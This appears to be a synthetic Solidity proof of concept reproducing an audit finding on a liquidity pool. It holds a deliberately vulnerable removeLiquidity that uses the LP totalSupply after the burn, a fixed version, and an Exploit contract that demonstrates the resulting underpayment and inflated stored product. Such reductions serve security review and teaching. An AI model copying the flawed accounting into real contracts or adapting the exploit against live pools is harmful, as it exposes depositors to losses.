// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Lucidly Pool.removeLiquidity — product uses totalSupply after the burn
    (Pashov Audit Group, Lucidly security review, finding H-12).

    SYNTHETIC, cheatcode-free reduction. Rates are 1 and the two weights are
    equal, so weight * n = 1 and the yETH power is the identity. The invariant
    `supply` and the LP `totalSupply` are the two values the report says are
    not the same. removeLiquidity burns LP, then feeds totalSupply() into the
    product. yETH uses `supply`.

    Here supply is 200 LP and totalSupply is 250 LP. Burning 50 LP pays 20 of
    each token instead of 25, and the stored product is 1.5625e18 instead of
    1e18. */

library FixedPointMathLib {
    function rawMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function rawDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LpToken {
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function setMinter(address minter_) external {
        require(minter == address(0), "minter");
        minter = minter_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract Pool {
    uint256 public constant PRECISION = 1e18;

    Asset public token0;
    Asset public token1;
    LpToken public lp;
    uint256 public supply;
    uint256 public numTokens;
    uint256 public weight;
    uint256 public storedProd;
    uint256 public paid0;
    uint256[] internal virtualBalances;

    constructor(Asset token0_, Asset token1_, LpToken lp_) {
        token0 = token0_;
        token1 = token1_;
        lp = lp_;
        lp.setMinter(address(this));
    }

    function _powDown(uint256 base, uint256 exp) internal pure returns (uint256) {
        require(exp == PRECISION, "exp");
        return base;
    }

    function seed(address holder) external {
        require(numTokens == 0, "seeded");
        virtualBalances.push(100 ether);
        virtualBalances.push(100 ether);
        numTokens = 2;
        weight = PRECISION / 2;
        supply = 200 ether;
        token0.mint(address(this), 100 ether);
        token1.mint(address(this), 100 ether);
        lp.mint(holder, 250 ether);
    }

    function removeLiquidity(uint256 lpAmount, address receiver) external virtual returns (uint256) {
        uint256 _numTokens = numTokens;
        uint256 _prevSupply = lp.totalSupply();
        lp.burn(msg.sender, lpAmount);
        uint256 _virtualBalanceProd = PRECISION;
        for (uint256 i; i < _numTokens; ++i) {
            uint256 __weight = weight;
            uint256 prev = virtualBalances[i];
            uint256 dvb = prev * lpAmount / _prevSupply;
            uint256 vb = prev - dvb;
            virtualBalances[i] = vb;
            if (i == 0) paid0 = dvb;
            // @> VULN: totalSupply() after the burn, not the invariant supply
            uint256 _ts = lp.totalSupply();
            uint256 _base = FixedPointMathLib.rawDiv(FixedPointMathLib.rawMul(_ts, __weight), vb);
            uint256 _pow = _powDown(_base, FixedPointMathLib.rawMul(__weight, _numTokens));
            _virtualBalanceProd = FixedPointMathLib.rawDiv(
                FixedPointMathLib.rawMul(_virtualBalanceProd, _pow),
                PRECISION
            );
            if (i == 0) token0.transfer(receiver, dvb);
            else token1.transfer(receiver, dvb);
        }
        storedProd = _virtualBalanceProd;
        return storedProd;
    }
}

contract PoolFixed is Pool {
    constructor(Asset token0_, Asset token1_, LpToken lp_) Pool(token0_, token1_, lp_) {}

    function removeLiquidity(uint256 lpAmount, address receiver) external override returns (uint256) {
        uint256 _numTokens = numTokens;
        uint256 _prevSupply = supply;
        supply = _prevSupply - lpAmount;
        lp.burn(msg.sender, lpAmount);
        uint256 _virtualBalanceProd = PRECISION;
        for (uint256 i; i < _numTokens; ++i) {
            uint256 __weight = weight;
            uint256 prev = virtualBalances[i];
            uint256 dvb = prev * lpAmount / _prevSupply;
            uint256 vb = prev - dvb;
            virtualBalances[i] = vb;
            if (i == 0) paid0 = dvb;
            uint256 _s = supply;
            uint256 _base = FixedPointMathLib.rawDiv(FixedPointMathLib.rawMul(_s, __weight), vb);
            uint256 _pow = _powDown(_base, FixedPointMathLib.rawMul(__weight, _numTokens));
            _virtualBalanceProd = FixedPointMathLib.rawDiv(
                FixedPointMathLib.rawMul(_virtualBalanceProd, _pow),
                PRECISION
            );
            if (i == 0) token0.transfer(receiver, dvb);
            else token1.transfer(receiver, dvb);
        }
        storedProd = _virtualBalanceProd;
        return storedProd;
    }
}

contract Holder {
    function pull(Pool pool, uint256 lpAmount) external {
        pool.removeLiquidity(lpAmount, address(this));
    }
}

contract Exploit {
    uint256 public constant PAID = 20 ether;
    uint256 public constant FAIR_PAID = 25 ether;
    uint256 public constant SHORT = 5 ether;
    uint256 public constant PRODUCT = 1562500000000000000;
    uint256 public constant FAIR_PRODUCT = 1 ether;
    uint256 public constant PRODUCT_GAP = 562500000000000000;

    Asset public token0;
    Asset public token1;
    LpToken public lp;
    Pool public pool;
    Holder public holder;
    uint256 public paid0;
    uint256 public product;

    constructor() {
        token0 = new Asset();
        token1 = new Asset();
        lp = new LpToken();
        pool = new Pool(token0, token1, lp);
        holder = new Holder();
    }

    function run() external {
        pool.seed(address(holder));
        holder.pull(pool, 50 ether);
        paid0 = token0.balanceOf(address(holder));
        product = pool.storedProd();
        require(pool.supply() == 200 ether, "supply not updated");
        require(paid0 == PAID, "paid");
        require(FAIR_PAID - paid0 == SHORT, "short");
        require(product == PRODUCT, "product");
        require(product - FAIR_PRODUCT == PRODUCT_GAP, "gap");
        require(token1.balanceOf(address(holder)) == PAID, "token1");
    }
}
